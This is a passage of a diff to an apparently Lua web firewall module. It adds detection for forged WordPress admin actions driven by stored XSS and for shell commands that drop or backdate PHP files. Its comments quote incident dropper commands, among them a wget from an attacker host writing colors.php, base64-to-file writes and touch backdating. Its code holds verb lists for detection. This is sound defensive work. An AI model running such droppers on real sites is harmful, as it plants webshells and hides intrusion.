@@ -634,6 +634,7 @@ end
 _M.PHP_FIELDS_WANT = {
   pagename = true, action = true, string_ids = true, ["trp-edit-translation"] = true,
   user_login = true, wc_reset_password = true, ["woocommerce-lost-password-nonce"] = true,
+  changeit = true, changeit2 = true, rest_route = true, _method = true, option_page = true, tab = true,  -- rule 503
 }
 
 -- want_hints(want): for each wanted name, the literal pieces any key PHP
@@ -3849,6 +3850,7 @@ end
 -- in detect_upload_filename (rule 401): .php[%d]* / .phtm[l] / .pht / .phar. If
 -- that set grows, grow this too (they intentionally match the same engine-mapped
 -- extensions; bad_fname is a nested local, so this is a parallel matcher).
+-- Rule 331 (SHW.is_exec) reuses it for a shell command's output name.
 local function _cve_sfl_has_exec_ext(s)
   if s:find("%.pht%f[%W]")       then return true end  -- .pht
   if s:find("%.phtml?%f[%W]")    then return true end  -- .phtm / .phtml
@@ -7531,6 +7533,19 @@ local function url_host(s)
   return (lower(strip_host_port((auth:gsub("^.*@", "")))):gsub("%.$", ""))
 end
 
+-- A request header, lowercased, from either spelling of its name; "" if absent.
+local function hdr_lower(headers, name, canon)
+  return lower(header_string(headers[name] or headers[canon]) or "")
+end
+
+-- The request's own host as the browser named it (the Host header, else the
+-- edge's), lowercased, without a port or a trailing dot; "" when unknown.
+local function request_host(headers, req_host)
+  local host = header_string(headers["host"] or headers["Host"])
+  if host == "" then host = req_host or "" end
+  return (lower(strip_host_port(host)):gsub("%.$", ""))
+end
+
 -- Same site for Sec-Fetch-Site same-site: equal, one under the other, or
 -- siblings under a parent that still has a dot (a.example.gr / b.example.gr,
 -- not example.gr / other.gr). An approximation of the registrable domain;
@@ -7552,9 +7567,7 @@ function _M.detect_cve_php_upload_progress(method, body, headers, req_host)
   if php_media_type(ct_raw) ~= "multipart/form-data" then return nil end
   local _, names = php_multipart_parse(body, ct_raw)
   if not names[UPLOAD_PROGRESS_NAME] then return nil end
-  local host = header_string(headers["host"] or headers["Host"])
-  if host == "" then host = req_host or "" end
-  host = (lower(strip_host_port(host)):gsub("%.$", ""))
+  local host = request_host(headers, req_host)
   local ref_raw = header_string(headers["referer"] or headers["Referer"])
   local org_raw = header_string(headers["origin"] or headers["Origin"])
   local ref, org = url_host(ref_raw), url_host(org_raw)
@@ -7562,7 +7575,7 @@ function _M.detect_cve_php_upload_progress(method, body, headers, req_host)
   -- scanner did (94.26.104.67, a same-site Referer, 2026-10-21). A browser
   -- also sends Fetch Metadata on every request (Chrome 76+, Firefox 90+,
   -- Safari 16.4+): a same-site one without it is not a browser's form.
-  local sfs = lower(header_string(headers["sec-fetch-site"] or headers["Sec-Fetch-Site"]) or "")
+  local sfs = hdr_lower(headers, "sec-fetch-site", "Sec-Fetch-Site")
   if host ~= "" then
     if ref == host or org == host then
       if sfs == "same-origin" or sfs == "same-site" then return "SAME_SITE" end
@@ -7575,6 +7588,688 @@ function _M.detect_cve_php_upload_progress(method, body, headers, req_host)
   end
   if ref or org then return "XSITE" end
   return "NO_REFERER"
+end
+
+-- Rule 503 — a WordPress privileged admin action that did not come from its own
+-- form (logonly). A stored XSS needs no exploit to own a site: the script runs
+-- in an administrator's browser and uses that session's cookie and nonces. On
+-- tophair.gr (2026-10-06) staff opened an order carrying the PixelYourSite
+-- payload and, within five seconds, their own browser fetched user-new.php and
+-- plugin-install.php for the nonces, POSTed user-new.php (a new administrator)
+-- and update.php?action=upload-plugin (a backdoor plugin as a ZIP) — every
+-- request with the ORDER SCREEN as its Referer. Nothing in those requests looks
+-- like an attack except where they came from.
+--
+-- WordPress sends these actions only from their own screen, by a navigation:
+--   * FROM:<screen> — a same-host Referer whose admin screen is not the
+--     form's (or a front-end page: FROM:front). Two months of titan's access
+--     logs (545 files, 2026-09/10): user-new.php 53 from user-new.php, 1 other;
+--     upload-plugin 332 from plugin-install.php, 1 none, 1 other; users.php 108
+--     and upload-theme 13, all from their own screen. The two others were the
+--     tophair attack. A missing Referer (Referrer-Policy no-referrer) is no
+--     signal on a form, and a cross-host one is left to the nonce.
+--   * SCRIPT / FRAME — Sec-Fetch-Dest `empty` (fetch / XHR) or `iframe`. A
+--     script can set a same-origin Referer with fetch() or drop it with a meta
+--     referrer policy, but it cannot set Fetch Metadata.
+--   * CROSS_SITE — Sec-Fetch-Site cross-site.
+--   * NO_ACTIVATION — a document navigation (Sec-Fetch-Mode navigate, Dest
+--     document) without Sec-Fetch-User: a form.submit() no click started.
+--   * NONCE_SCRAPE:<screen> / NONCE_FRAME:<screen> — a GET of a screen that
+--     hands out one of these nonces by fetch / XHR, or into an iframe (the
+--     browser loads them as documents; only plugin-install.php's
+--     plugin-information thickbox is an iframe, so it is not checked there).
+--     The tophair script fetched two of them first.
+-- The legs (docs/waf.md "Rule 503" lists them): the user screens (create,
+-- edit, profile, delete/remove, the role change WordPress sends as a GET of
+-- users.php's own form, multisite site-users.php), core's General settings
+-- (options.php option_page=general: registration, default role), update.php
+-- upload / install / activate (POST, or the GETs that install a package or a
+-- wordpress.org slug), plugin activation (Fetch Metadata only: "Activate"
+-- links sit on themes' and plugins' own pages), the file editor (its form and
+-- admin-ajax), admin-ajax plugin install / activate, and cookie-authenticated
+-- REST writes to users, application passwords and plugins (always XHR: the
+-- Referer decides, and a missing or bare-origin one counts as NO_REFERER — a
+-- WordPress admin page sends strict-origin-when-cross-origin; a spoofed
+-- Referer is a residual). Any Sec-Fetch-Dest but document is a page's script
+-- or markup (FRAME when framed). REST is routed as WordPress routes it: every
+-- rest_route field, any spelling PHP registers, before the /wp-json/ path;
+-- case-insensitive, after untrailingslashit, `$` before a final newline; a
+-- GET under _method / X-HTTP-Method-Override is a write.
+-- Fields are read as PHP registers them (php_request_fields), any value
+-- rather than PHP's last: the project's rule (a trailing duplicate past
+-- max_input_vars is a decoy PHP never saw), and an over-read here only logs a
+-- request no browser sends. The screen follows the FIRST /wp-admin/ and is cut
+-- at its `.php` (PATH_INFO). Only with a WordPress login cookie: without one
+-- WordPress refuses the action anyway.
+-- An enumeration is never complete (four review rounds kept finding routes to
+-- the same outcomes): this detects the kill chain as it is run, it does not
+-- seal WordPress. docs/waf.md "Rule 503" lists the known residuals.
+--
+-- Logonly through its burn-in. The client IP is the victim's (the staff
+-- member's browser), never the attacker's: a promotion to block must hold the
+-- autoblock for this rule (HoldAutoblock), and a hit means the site already
+-- holds a stored payload somewhere an administrator just opened.
+-- Endpoint legs. `from` = the screens WordPress sends it from (absent:
+-- Fetch Metadata only); `xhr` = always fetch/XHR, so the Referer decides.
+local XSC = {}  -- rule 503's tables and helpers (one module local: LuaJIT caps a chunk at 200)
+XSC.leg = {
+  user_new       = { tag = "USER_NEW",       from = { ["user-new.php"] = true } },
+  users          = { tag = "USERS",          from = { ["users.php"] = true } },
+  users_role     = { tag = "USERS_ROLE",     from = { ["users.php"] = true } },
+  user_edit      = { tag = "USER_EDIT",      from = { ["user-edit.php"] = true } },
+  profile        = { tag = "PROFILE",        from = { ["profile.php"] = true, ["user-edit.php"] = true } },
+  site_users     = { tag = "SITE_USERS",     from = { ["site-users.php"] = true } },
+  options_general = { tag = "OPTIONS_GENERAL", from = { ["options-general.php"] = true } },
+  upload_plugin  = { tag = "UPLOAD_PLUGIN",  from = { ["plugin-install.php"] = true, ["update.php"] = true } },
+  upload_theme   = { tag = "UPLOAD_THEME",   from = { ["theme-install.php"] = true, ["update.php"] = true } },
+  -- A POST to update.php whose action the edge did not see (past the body
+  -- window): update.php takes uploads only.
+  upload         = { tag = "UPLOAD",         from = { ["plugin-install.php"] = true, ["theme-install.php"] = true, ["update.php"] = true } },
+  install_plugin = { tag = "INSTALL_PLUGIN", from = { ["plugin-install.php"] = true } },
+  install_theme  = { tag = "INSTALL_THEME",  from = { ["theme-install.php"] = true, ["themes.php"] = true } },
+  activate       = { tag = "ACTIVATE" },
+  file_editor_form = { tag = "FILE_EDITOR",  from = { ["theme-editor.php"] = true, ["plugin-editor.php"] = true } },
+  file_editor    = { tag = "FILE_EDITOR",    from = { ["theme-editor.php"] = true, ["plugin-editor.php"] = true }, xhr = true },
+  ajax_plugin    = { tag = "AJAX_PLUGIN",    from = { ["plugins.php"] = true, ["plugin-install.php"] = true }, xhr = true },
+  rest_users     = { tag = "REST_USERS",     from = {}, xhr = true },
+  rest_app_pw    = { tag = "REST_APP_PASSWORD", xhr = true,
+                     from = { ["profile.php"] = true, ["user-edit.php"] = true, ["authorize-application.php"] = true } },
+  rest_plugins   = { tag = "REST_PLUGINS",   from = { ["plugins.php"] = true, ["plugin-install.php"] = true }, xhr = true },
+}
+XSC.users_delete = { dodelete = true, doremove = true }
+XSC.promote = { promote = true }
+XSC.user_new_actions = { adduser = true, createuser = true }
+XSC.site_users_actions = { newuser = true, adduser = true, promote = true, remove = true }
+XSC.update = { ["upload-plugin"] = XSC.leg.upload_plugin, ["upload-theme"] = XSC.leg.upload_theme,
+               ["install-plugin"] = XSC.leg.install_plugin, ["install-theme"] = XSC.leg.install_theme,
+               ["activate-plugin"] = XSC.leg.activate }
+XSC.activate_actions = { activate = true, ["activate-selected"] = true }
+XSC.ajax = { ["edit-theme-plugin-file"] = XSC.leg.file_editor,
+             ["install-plugin"] = XSC.leg.ajax_plugin, ["activate-plugin"] = XSC.leg.ajax_plugin }
+-- Screens holding a nonce for one of the legs; true = also never framed by
+-- WordPress (plugin-install.php is, for tab=plugin-information only).
+XSC.nonce_pages = {
+  ["user-new.php"] = true, ["users.php"] = true, ["user-edit.php"] = true, ["profile.php"] = true,
+  ["site-users.php"] = true, ["plugins.php"] = true, ["plugin-install.php"] = true, ["theme-install.php"] = true,
+  ["theme-editor.php"] = true, ["plugin-editor.php"] = true, ["options-general.php"] = true,
+}
+XSC.rest_write = { post = true, put = true, patch = true, delete = true }
+-- Busy core admin screens: real files Apache serves itself, never rewritten to
+-- index.php, so no REST route runs there. (A path under /wp-admin/ that is no
+-- file is rewritten to index.php, which serves ?rest_route=.)
+XSC.core_screens = {
+  ["post.php"] = true, ["post-new.php"] = true, ["edit.php"] = true, ["admin.php"] = true, ["index.php"] = true,
+  ["upload.php"] = true, ["async-upload.php"] = true, ["admin-post.php"] = true, ["admin-ajax.php"] = true,
+  ["load-scripts.php"] = true, ["load-styles.php"] = true, ["edit-tags.php"] = true, ["term.php"] = true,
+  ["nav-menus.php"] = true, ["widgets.php"] = true, ["customize.php"] = true, ["site-editor.php"] = true,
+  ["options.php"] = true, ["themes.php"] = true, ["update-core.php"] = true, ["media-new.php"] = true,
+}
+-- Sec-Fetch-Dest of a request a page's own script or markup sent, not a
+-- navigation: a framed load (FRAME) or anything else (SCRIPT: fetch/XHR
+-- `empty`, and `<img>`, `<script>`, `<link>`… — a GET via new Image() is a
+-- request WordPress's forms never make).
+XSC.frame_dest = { iframe = true, frame = true, object = true, embed = true }
+-- Account fields of a /wp/v2/users/me write, as a JSON or form KEY.
+XSC.account_keys = { "email", "password", "roles", "username" }
+
+-- The admin screen of a LOWERCASED path: what follows the FIRST "/wp-admin/"
+-- (WordPress's $pagenow takes the first; PATH_INFO may hold another),
+-- without the multisite "network/" and "user/" prefixes (same forms), cut
+-- after its `.php` (Apache's AcceptPathInfo runs user-new.php/x as
+-- user-new.php). "/wp-admin/" itself is index.php. nil off wp-admin.
+function XSC.screen(lpath)
+  local s = lpath:match("^.-/wp%-admin/(.*)$")
+  if not s then return nil end
+  s = s:gsub("^network/", ""):gsub("^user/", "")
+  s = s:match("^([^/]-%.php)") or s
+  if s == "" then s = "index.php" end
+  return s
+end
+
+-- A screen as it may appear in a reason tag: a short, plain token.
+function XSC.token(s)
+  return (s:gsub("[^%w%._%-/]", "_")):sub(1, 48)
+end
+
+function XSC.any_value(f, name, set)
+  for _, v in ipairs(f[name] or {}) do
+    local hit = set[lower((v:gsub("\r", "")))]
+    if hit then return hit end
+  end
+  return nil
+end
+function XSC.any_action(f, set) return XSC.any_value(f, "action", set) end
+
+-- The leg of an admin screen request, by screen and fields; any method where
+-- WordPress reads the action from $_REQUEST (several work by GET). fields()
+-- parses lazily. nil for a screen with no leg.
+function XSC.leg_of(method, screen, fields)
+  local L = XSC.leg
+  if screen == "users.php" then
+    local f = fields()
+    if f.changeit or f.changeit2 or XSC.any_action(f, XSC.promote) then return L.users_role end
+    if XSC.any_action(f, XSC.users_delete) then return L.users end
+    return method == "post" and L.users or nil
+  elseif screen == "user-new.php" then
+    if method == "post" or XSC.any_action(fields(), XSC.user_new_actions) then return L.user_new end
+  elseif screen == "user-edit.php" then
+    if method == "post" then return L.user_edit end
+  elseif screen == "profile.php" then
+    if method == "post" then return L.profile end
+  elseif screen == "site-users.php" then
+    if method == "post" or XSC.any_action(fields(), XSC.site_users_actions) then return L.site_users end
+  elseif screen == "options.php" then
+    -- Only core's General settings (users_can_register, default_role,
+    -- new_admin_email); plugin settings pages post here from admin.php.
+    if method == "post" and XSC.any_value(fields(), "option_page", { general = true }) then return L.options_general end
+  elseif screen == "update.php" then
+    return XSC.any_action(fields(), XSC.update) or (method == "post" and L.upload or nil)
+  elseif screen == "plugins.php" then
+    if XSC.any_action(fields(), XSC.activate_actions) then return L.activate end
+  elseif screen == "theme-editor.php" or screen == "plugin-editor.php" then
+    if method == "post" then return L.file_editor_form end
+  elseif screen == "admin-ajax.php" then
+    if method == "post" then return XSC.any_action(fields(), XSC.ajax) end
+  end
+  return nil
+end
+
+-- The REST leg of one route candidate, as WordPress dispatches it:
+-- untrailingslashit (every trailing / or \), then `@^route$@i` — PCRE's `$`
+-- also matches before one final newline. /wp/v2/users/me is the block
+-- editor's and wc-admin's preferences store (persisted_preferences,
+-- woocommerce_meta): only a write naming an account field counts there.
+function XSC.rest_leg(route, sensitive)
+  local r = lower(route):gsub("[/\\]+$", ""):gsub("\n$", "")
+  local L = XSC.leg
+  if r:find("^/wp/v2/users/[^/]+/application%-passwords") then return L.rest_app_pw end
+  if r == "/wp/v2/users" or r:find("^/wp/v2/users/%d+$") then return L.rest_users end
+  if r == "/wp/v2/users/me" then return sensitive() and L.rest_users or nil end
+  if r == "/wp/v2/plugins" or r:find("^/wp/v2/plugins/") then return L.rest_plugins end
+  return nil
+end
+
+-- An account field named as a KEY (a JSON key, or a form field) in the
+-- decoded surface, not a value that merely mentions one.
+function XSC.names_account_field(nab)
+  for _, k in ipairs(XSC.account_keys) do
+    if nab:find(k, 1, true) and (nab:find('"' .. k .. '"%s*:') or nab:find("^" .. k .. "=") or nab:find("[&?]" .. k .. "=")
+       or nab:find("[&?]" .. k .. "%[")) then
+      return true
+    end
+  end
+  return false
+end
+
+function _M.detect_wp_admin_cross_screen(method, uri, args, body, headers, cookie, req_host, get_fields, get_nab)
+  -- The login cookie first: nearly all traffic is anonymous. A plain find, no
+  -- lowercased copy of the whole header: the cookie is the one WordPress set
+  -- in the victim's browser, always named in lowercase.
+  if not cookie or cookie == "" or not cookie:find("wordpress_logged_in_", 1, true) then return nil end
+  local u = lower(uri or "")
+  local screen = XSC.screen(u)
+  local json_path = not screen and u:match("^.-/wp%-json(/.*)$")
+  -- ?rest_route= (or rest.route, rest[route, an encoded name: PHP decodes
+  -- them all) needs a query or a body that names a route; a cheap raw look
+  -- first, the parse decides.
+  local function may_name_route()
+    local a, b = args or "", body or ""
+    if a == "" and b == "" then return false end
+    -- The decoded, lowercased args+body the earlier rules already built
+    -- (memoized by cfm_waf.check): PHP decodes field names, so an encoded
+    -- letter cannot hide the word there. A standalone caller has none: the
+    -- raw word, or any escape at all.
+    if get_nab then return has(get_nab(), "route") end
+    return a:find("route", 1, true) or a:find("%", 1, true) or b:find("route", 1, true) or b:find("%", 1, true)
+  end
+  if not screen and not json_path and not may_name_route() then return nil end
+  headers = headers or {}
+  local _f
+  local function fields()
+    if not _f then _f = request_fields(method, args, body, headers, get_fields) end
+    return _f
+  end
+  local dest = hdr_lower(headers, "sec-fetch-dest", "Sec-Fetch-Dest")
+  local scripted = dest ~= "" and dest ~= "document"
+
+  local ep
+  if screen then
+    -- admin-ajax carries every logged-in user's heartbeat: parse its fields
+    -- only when the decoded surface holds one of the actions checked there.
+    if screen == "admin-ajax.php" then
+      if method ~= "post" then return nil end
+      -- Every XSC.ajax action holds "plugin" (the Lua test pins it).
+      if not field_gate_open(method, args, body, headers, get_nab and get_nab(), "plugin", true) then return nil end
+    end
+    ep = XSC.leg_of(method, screen, fields)
+    if not ep and method == "get" then
+      local frame_ok = XSC.nonce_pages[screen]
+      if frame_ok ~= nil and scripted
+         and not has(hdr_lower(headers, "sec-purpose", "Sec-Purpose"), "prefetch") then
+        if not XSC.frame_dest[dest] then return "NONCE_SCRAPE:" .. XSC.token(screen) end
+        -- WordPress frames plugin-install.php for plugin information only.
+        if not (screen == "plugin-install.php"
+                and XSC.any_value(fields(), "tab", { ["plugin-information"] = true })) then
+          return "NONCE_FRAME:" .. XSC.token(screen)
+        end
+      end
+      return nil
+    end
+  end
+  if not ep then
+    if screen and XSC.core_screens[screen] then return nil end
+    -- REST. WordPress prefers $_GET / $_POST rest_route over the permalink
+    -- (and serves it from a path its rewrite sends to index.php, even one
+    -- under /wp-admin/), and a GET under _method or X-HTTP-Method-Override
+    -- is a write. Every candidate is tested (any value: a trailing duplicate
+    -- past max_input_vars is a decoy PHP never saw).
+    if not json_path and not may_name_route() then return nil end
+    local f = fields()
+    local write = XSC.rest_write[method]
+      or XSC.rest_write[hdr_lower(headers, "x-http-method-override", "X-HTTP-Method-Override")]
+      or XSC.any_value(f, "_method", XSC.rest_write)
+    if not write then return nil end
+    local function sensitive()
+      local nab = (get_nab and get_nab()) or lower((args or "") .. "&" .. (body or ""))
+      return XSC.names_account_field(nab)
+    end
+    for _, r in ipairs(f.rest_route or {}) do
+      ep = XSC.rest_leg(r, sensitive)
+      if ep then break end
+    end
+    if not ep and json_path then ep = XSC.rest_leg(json_path, sensitive) end
+    if not ep then return nil end
+  end
+
+  if not ep.xhr and scripted then
+    return ep.tag .. (XSC.frame_dest[dest] and ":FRAME" or ":SCRIPT")
+  end
+
+  local site = hdr_lower(headers, "sec-fetch-site", "Sec-Fetch-Site")
+  if ep.from then
+    local host = request_host(headers, req_host)
+    local ref_raw = header_string(headers["referer"] or headers["Referer"])
+    -- A bare origin (Referrer-Policy origin / strict-origin: "https://host/",
+    -- never a query) names no screen. On a form it is no signal, like a
+    -- missing Referer; an XHR leg from a WordPress admin page carries the full
+    -- URL (strict-origin-when-cross-origin), so there it counts as missing.
+    local bare = ref_raw == ""
+    if host ~= "" and url_host(ref_raw) == host then
+      local path, query = ref_raw:match("^%a[%w+.%-]*://[^/?#]*([^?#]*)(%??)")
+      if (path == nil or path == "" or path == "/") and query ~= "?" then
+        bare = true
+      else
+        local from = XSC.screen(lower(path ~= "" and path or "/"))
+        if not from then return ep.tag .. ":FROM:front" end
+        if not ep.from[from] then return ep.tag .. ":FROM:" .. XSC.token(from) end
+      end
+    end
+    if ep.xhr and bare and site == "same-origin" then return ep.tag .. ":NO_REFERER" end
+  end
+
+  if site == "cross-site" then return ep.tag .. ":CROSS_SITE" end
+  if not ep.xhr and hdr_lower(headers, "sec-fetch-mode", "Sec-Fetch-Mode") == "navigate" and dest == "document"
+     and hdr_lower(headers, "sec-fetch-user", "Sec-Fetch-User") == "" then
+    return ep.tag .. ":NO_ACTIVATION"
+  end
+  return nil
+end
+
+-- Rule 331 — a shell command that writes an executable file into the site or
+-- backdates one (logonly). The tophair.gr webshell (2026-10-08, a WPCode
+-- snippet serving a file manager and a terminal at /?dark&term=1) wrote its
+-- droppers with commands POSTed in a form field, and rules 310-317 read the
+-- query string only: a replay of `wget -q https://kaye1337.pages.dev/stfu/m.jpg
+-- -O wp-admin/css/colors/midnight/colors.php`, `curl -o x.php URL`,
+-- `echo <b64> | base64 -d > x.php` and `touch -d '2025-07-10 20:39' g.php` in a
+-- POST body matched nothing. This reads the decoded args AND body.
+--
+-- Fires on a command at a command position (the start of a value; after
+-- `;` `|` `&&` `` ` `` `$(` or a newline; inside a JSON value or sh -c '…';
+-- behind an absolute path or a prefix word such as sudo / nohup) that:
+--   * FETCH_TO_EXEC — wget / curl with its output (-O, -o, --output,
+--     --output-document; or curl -O of a URL ending in one) going to an
+--     executable name; "-O -" is stdout (the wp-cron line), not a file;
+--   * REDIRECT_TO_EXEC — echo / printf / cat / base64 / xxd / wget / curl /
+--     perl / python / php / openssl / gzip output redirected (> or >>) to an
+--     executable name, or a tee to one;
+--   * TOUCH_BACKDATE — touch -d / -t / -r / --date / --reference before its
+--     first operand: the mtime backdating that made g.php look a year old.
+-- Executable: rule 401's PHP set (.php[0-9]*, .phtm[l], .pht, .phar), .inc,
+-- .htaccess, .user.ini. Form values never carry these; a tutorial pasted into
+-- a comment, or staff saving a how-to post, could, which is why it starts
+-- logonly. Family WAF_RCE (autoblock-armed for block hits only).
+-- Limits (docs/waf.md "Rule 331"): a command is read for 4 KB, 32 words and
+-- 256 special bytes, at most 64 commands per verb a request; a verb or name
+-- hidden by shell quoting or variables is not seen.
+local SHW = {}  -- rule 331's tables and helpers (one module local: LuaJIT caps a chunk at 200)
+SHW.fetchers = { wget = true, curl = true }
+SHW.writers = { echo = true, printf = true, cat = true, base64 = true, xxd = true, wget = true, curl = true,
+                perl = true, python = true, python3 = true, php = true, openssl = true, gzip = true, gunzip = true }
+-- The verbs, searched one by one with a plain find: a class-pattern scan of the
+-- whole surface costs ~20 ns a byte in LuaJIT (400 us on a 19 KB page-builder
+-- body), a plain find a few us. tee writes its operands (… | base64 -d | tee x.php).
+SHW.verbs = { "wget", "curl", "touch", "tee", "echo", "printf", "cat", "base64", "xxd", "perl", "python",
+              "python3", "php", "openssl", "gzip", "gunzip" }
+-- Words that run the word after them as a command (sudo wget …).
+SHW.prefix = { sudo = true, nohup = true, env = true, exec = true, command = true, busybox = true,
+               nice = true, time = true, xargs = true }
+-- Bytes that open a command: = ; | & ` and newline. '(' only as "$(", ':' only
+-- before a JSON value's quote (at_command), never bare: "usage: echo" is prose.
+SHW.sep = { [61] = true, [59] = true, [124] = true, [38] = true, [96] = true, [10] = true, [13] = true }
+-- Blanks: space, tab, VT, FF and '+' (a form-encoded space).
+SHW.blank = { [32] = true, [9] = true, [11] = true, [12] = true, [43] = true }
+-- The byte before a verb that can begin a command position: the cheap first
+-- test, before at_command's loop. A letter (sudo wget, a JSON \n) is tested in scan.
+SHW.lead = { [34] = true, [39] = true, [40] = true, [47] = true }
+for b in pairs(SHW.sep) do SHW.lead[b] = true end
+for b in pairs(SHW.blank) do SHW.lead[b] = true end
+-- Byte classes at_command reads back over, each for a bounded length: a word
+-- before the verb (a prefix, or an assignment's value), an assignment's name,
+-- the directory of an absolute path to the verb.
+function SHW.class(chars)
+  local c = {}
+  for i = 1, #chars do c[chars:byte(i)] = true end
+  for b = 48, 57 do c[b] = true end
+  for b = 97, 122 do c[b] = true end
+  for b = 65, 90 do c[b] = true end
+  return c
+end
+SHW.word, SHW.name, SHW.path = SHW.class("_./:,@%-"), SHW.class("_"), SHW.class("_./-")
+-- Read back from k over bytes in class cls, at most cap of them.
+function SHW.back(t, k, cls, cap)
+  local stop = k - cap
+  while k > stop and k > 0 and cls[t:byte(k)] do k = k - 1 end
+  return k
+end
+
+-- Is a shell word (an output path or a URL) an executable file name? The PHP
+-- extensions are rule 401's / 10001's set (_cve_sfl_has_exec_ext: .php[0-9]*,
+-- .phtm[l], .pht, .phar), plus .inc, .htaccess and .user.ini.
+function SHW.is_exec(tok)
+  if not tok or tok == "" then return false end
+  tok = tok:gsub("^[\"']+", ""):gsub("[\"';,)}%]]+$", "")
+  tok = tok:match("^[^?#]*") or tok          -- a URL's query / fragment
+  local base = tok:match("([^/\\]*)$") or tok
+  if base == ".htaccess" or base == ".user.ini" or base:find("%.inc$") then return true end
+  local ext = base:match("%.[%w]+$")          -- the last one: x.php.txt is not run
+  return ext ~= nil and _cve_sfl_has_exec_ext(ext)
+end
+
+function SHW.alpha(b) return b ~= nil and ((b >= 97 and b <= 122) or (b >= 65 and b <= 90)) end
+
+-- Is the word at `at` in a command position? Returns false, or what opened
+-- it: true (the start of the surface), the separator's byte (124: a pipe, for
+-- tee), 40 for "$(", or the quote's byte (34 for a JSON value or sh -c "…",
+-- 39 for sh -c '…'; parse ends the command at its closing quote). Reads back over blanks
+-- (a JSON \t too; a JSON \n or \r is a newline), an absolute path to the verb
+-- (/usr/bin/wget) and up to three prefix words (sudo, nohup, …, or an
+-- assignment: HOME=/tmp wget). Every read-back is bounded, so a value of
+-- repeated verbs costs linear time. A quote after anything but ':' '[' ','
+-- (JSON) or -c is markup (class="cat"), not a command.
+function SHW.at_command(t, at)
+  local k, hops = at - 1, 0
+  if t:byte(k) == 47 then                     -- /usr/bin/wget, /sbin/…
+    if t:sub(k - 3, k) ~= "bin/" then return false end
+    k = SHW.back(t, k, SHW.path, 32)
+  end
+  while true do
+    if k < 1 then return true end             -- the start of the surface
+    local b = t:byte(k)
+    if SHW.blank[b] then
+      k = SHW.back(t, k, SHW.blank, 64)
+      if k > 0 and SHW.blank[t:byte(k)] then return false end
+    elseif SHW.sep[b] then
+      return b
+    elseif (b == 110 or b == 114 or b == 116) and t:byte(k - 1) == 92 then
+      if b ~= 116 then return 10 end          -- JSON \n / \r
+      k = k - 2                               -- JSON \t
+    elseif b == 40 then
+      return t:byte(k - 1) == 36 and 40 or false  -- $( … )
+    elseif b == 34 or b == 39 then
+      local j = SHW.back(t, k - 1, SHW.blank, 64)
+      local p = t:byte(j)
+      if b == 34 and (p == 58 or p == 91 or p == 44) then return 34 end  -- "k":"…", ["…", ,"…"
+      if p == 99 and t:byte(j - 1) == 45 and SHW.blank[t:byte(j - 2) or 32] then return b end  -- sh -c "…"
+      return false
+    elseif SHW.word[b] and hops < 3 then
+      local e = k
+      k = SHW.back(t, k, SHW.word, 64)
+      if SHW.prefix[t:sub(k + 1, e)] then     -- sudo, nohup, … (cmd=sudo wget)
+        hops = hops + 1
+      elseif t:byte(k) == 61 then             -- NAME=value
+        local ne = k - 1
+        k = SHW.back(t, ne, SHW.name, 32)
+        local p = t:byte(k)
+        -- After a blank, ; | ` a newline or '=' (cmd=HOME=/tmp wget); never
+        -- at the start or after '&', where name=value is a form field
+        -- (comment=please echo …).
+        if k == ne or k < 1 or p == 38 or not (SHW.blank[p] or SHW.sep[p]) then return false end
+        hops = hops + 1
+      else
+        return false
+      end
+    else
+      return false
+    end
+  end
+end
+
+-- The command after a verb, up to the next separator outside quotes, as shell
+-- words (quotes stripped) and the targets of its > / >> redirections. It jumps
+-- from one special character to the next (find), never char by char, builds
+-- words from a table of pieces (never a growing string), and reads at most
+-- SHW.window bytes, SHW.max_words words and SHW.max_steps special bytes (a
+-- dropper command has a handful of each; a quoted payload is one word and one
+-- step); the third result is the end of what it read.
+--
+-- It reads the raw surface, JSON included. Outside quotes: a JSON \n / \r ends
+-- the command, \t is a blank, \"…\" is a quoted string, any other \x is x (\/
+-- is /, as a shell escape too). A quote that has no closing one in the window,
+-- or that is followed by , } ] : & or the end, closes the value the command
+-- sits in (a JSON string, a form field, sh -c '…') and ends the command.
+SHW.window, SHW.max_words, SHW.max_steps = 4096, 32, 256  -- a quoted webshell body fits
+SHW.qend = { [44] = true, [125] = true, [93] = true, [58] = true, [38] = true }
+function SHW.parse(s, from)
+  local words, targets, buf = {}, {}, {}
+  local n = math.min(#s, from + SHW.window)
+  local want_target, i, steps = false, from, 0
+  local function flush()
+    if #buf > 0 then
+      local w = table.concat(buf)
+      buf = {}
+      if want_target then targets[#targets + 1] = w; want_target = false else words[#words + 1] = w end
+    end
+  end
+  while i <= n and #words + #targets < SHW.max_words and steps < SHW.max_steps do
+    steps = steps + 1
+    local j = s:find("[%s+;|&`'\">\\]", i)
+    if not j or j > n then buf[#buf + 1] = s:sub(i, n); i = n + 1; break end
+    if j > i then buf[#buf + 1] = s:sub(i, j - 1) end
+    local c = s:byte(j)
+    if c == 39 or c == 34 then                  -- ' or ": to the closing quote
+      local nx = s:byte(j + 1)
+      local k = s:find(c == 39 and "'" or '"', j + 1, true)
+      if not k or k > n or nx == nil or SHW.qend[nx] then i = j; break end  -- the value's own end
+      buf[#buf + 1] = s:sub(j + 1, k - 1); i = k + 1
+    elseif c == 62 or (c == 38 and s:byte(j + 1) == 62) then  -- > >> >| &> &>>
+      flush(); want_target = true
+      i = (c == 38) and j + 2 or j + 1
+      if s:byte(i) == 62 then i = i + 1 end
+      local nx = s:byte(i)
+      if nx == 124 or nx == 38 then i = i + 1 end  -- >| clobber; >&2 is an fd, read as a word
+    elseif c == 10 or c == 13 or c == 59 or c == 124 or c == 38 or c == 96 then
+      i = j; break                               -- \n \r ; | & `
+    elseif c == 92 then                          -- a backslash
+      local e = s:byte(j + 1)
+      if e == 110 or e == 114 then i = j; break end  -- JSON \n \r
+      if e == 116 then
+        flush(); i = j + 2                       -- JSON \t
+      elseif e == 34 then                        -- JSON \"…\"
+        local k = s:find('\\"', j + 2, true)
+        if k and k <= n then buf[#buf + 1] = s:sub(j + 2, k - 1); i = k + 2 else i = j + 2 end
+      else
+        if e then buf[#buf + 1] = string.char(e) end
+        i = j + 2
+      end
+    else
+      flush(); i = j + 1                         -- other whitespace, '+'
+    end
+  end
+  flush()
+  return words, targets, i
+end
+
+-- A URL that saves under its own file name (curl -O, plain wget): the path's
+-- last segment, with no query (wget keeps it in the name: wp-cron.php?x).
+function SHW.url_exec(w)
+  local path = w:match("^%a+://[^/?#]+(/[^#]*)$")
+  return path ~= nil and not path:find("?", 1, true) and SHW.is_exec(path)
+end
+
+function SHW.check(verb, words, targets)
+  if verb == "touch" then
+    -- An option before the first operand (touch -c -d '…' file); "--" ends them.
+    for _, w in ipairs(words) do
+      if w == "--" then break end
+      if w:sub(1, 2) == "--" then
